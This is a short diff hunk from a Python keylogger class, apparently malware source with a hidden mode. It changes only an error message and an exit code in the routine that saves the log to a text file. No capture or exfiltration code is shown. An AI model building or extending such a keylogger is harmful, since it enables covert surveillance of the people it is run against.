@@ -43,8 +43,8 @@ class Keylogger:
                 if not self.isHidden:
                     print(f"[+] Saved {self.filename}.txt")
         except FileNotFoundError:
-            print("Invalid File Location")
-            exit(0)
+            print("Invalid Folder Location")
+            exit(1)
             
     def report(self):
         if self.log:
